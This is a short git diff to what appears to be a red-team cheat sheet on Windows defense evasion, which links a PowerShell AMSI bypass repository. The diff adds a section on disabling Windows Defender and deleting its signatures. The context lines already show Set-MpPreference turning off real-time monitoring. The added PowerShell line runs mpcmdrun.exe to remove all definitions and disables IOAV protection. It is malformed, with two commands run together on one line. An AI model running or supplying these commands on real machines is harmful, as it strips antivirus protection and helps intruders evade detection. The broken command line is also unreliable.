@@ -81,6 +81,11 @@ Link: [PowerShell AMSI Bypass](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Pow
 # Turn Off
 Set-MpPreference -DisableRealtimeMonitoring $true
 ```
+### Disable Windows Defender and delete signatures
+```powershell
+# Turn Off
+"c:\Program Files\Windows Defender\mpcmdrun.exe" -RemoveDefinitions -All Set-MpPreference -DisableIOAVProtection $true
+```
 **Example:**
 
 ![Main Logo](images/Example_Defender01.PNG 'ExampleDefender')
